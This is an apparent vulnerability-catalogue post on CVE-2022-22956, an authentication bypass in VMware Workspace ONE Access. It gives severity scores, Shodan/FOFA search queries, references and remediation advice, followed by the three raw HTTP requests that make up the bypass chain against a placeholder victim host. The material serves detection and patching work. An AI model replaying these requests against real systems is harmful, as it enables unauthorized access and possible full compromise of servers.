---
layout: post
cve_id: CVE-2022-22956
title: VMware Workspace ONE Access - Authentication Bypass
pcap: true
pcap_path: /pcaps/2022/CVE-2022-22956.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2022/CVE-2022-22956.yaml
snort2_rule: N/A
snort3_rule: N/A
author: daffainfo
severity: critical
impact: 'Attackers can bypass authentication and perform unauthorized operations,
  potentially leading to full system compromise.

  '
remediation: 'Apply the latest security patches provided by VMware to address these
  vulnerabilities.

  '
reference:
- https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/vmware_workspace_one_access_vmsa_2022_0011_chain.rb
- https://srcincite.io/blog/2022/08/11/i-am-whoever-i-say-i-am-infiltrating-vmware-workspace-one-access-using-a-0-click-exploit.html
- https://nvd.nist.gov/vuln/detail/CVE-2022-22956
- http://packetstormsecurity.com/files/171918/Mware-Workspace-ONE-Remote-Code-Execution.html
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2022-22956
  cwe-id: CWE-287
  epss-score: 0.81455
  epss-percentile: 0.99139
  cpe: cpe:2.3:a:vmware:identity_manager:3.3.3:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 3
  vendor: vmware
  product: identity_manager
  shodan-query: http.favicon.hash:"-1250474341"
  fofa-query: icon_hash=-1250474341
tags:
- cve
- cve2022
- vmware
- workspace
- auth-bypass
- vkev
- vuln
---

## üîç Vulnerability Description
VMware Workspace ONE Access has two authentication bypass vulnerabilities (CVE-2022-22955 & CVE-2022-22956) in the OAuth2 ACS framework. A malicious actor may bypass the authentication mechanism and execute any operation due to exposed endpoints in the authentication framework.


## üåê HTTP Request
```nohighlight
POST /SAAS/API/1.0/REST/oauth2/generateActivationToken/Service__OAuth2Client HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Connection: close
Transfer-Encoding: chunked
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

0
```

```nohighlight
POST /SAAS/API/1.0/REST/oauth2/activate HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Mobile/15E148 Safari/604.1
Connection: close
Content-Length: 6
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

dktX8T
```

```nohighlight
POST /SAAS/auth/oauthtoken HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/608.2.11 (KHTML, like Gecko) Version/13 Safari/608.2.11
Connection: close
Content-Length: 67
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

grant_type=client_credentials&client_id=gjXsKe&client_secret=1TW5qv
```

